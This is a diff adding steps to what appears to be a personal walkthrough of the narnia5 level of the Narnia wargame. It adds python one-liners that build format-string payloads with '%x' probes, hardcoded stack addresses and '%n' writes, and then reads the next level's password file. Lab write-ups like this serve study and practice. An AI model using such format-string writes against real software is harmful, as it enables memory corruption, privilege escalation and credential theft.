@@ -77,6 +77,21 @@ cd /tmp/zulu
 whoami
 cat /etc/narnia_pass/narnia5
 
+# narnia5 -> narnia6
+vim narnia5.c
+./narnia5 `python -c 'print "AAAA"+"%x."*5'`
+./narnia5 `python -c 'print "\xd0\xd6\xff\xffAAAA"+"%n"'`
+./narnia5 `python -c 'print "\xd0\xd6\xff\xff"+ "A" * 10+"%n"'`
+./narnia5 `python -c 'print "\xd0\xd6\xff\xff"+ "A" * 492+"%n"'`
+./narnia5 `python -c 'print "\xf0\xd4\xff\xff"+ "A" * 492+"%n"'`
+./narnia5 `python -c 'print "\xf0\xd4\xff\xff"+ "A" * 496+"%n"'`
+whoami
+cat /etc/narnia_pass/narnia6
+
+
+
+
+
 
 
 
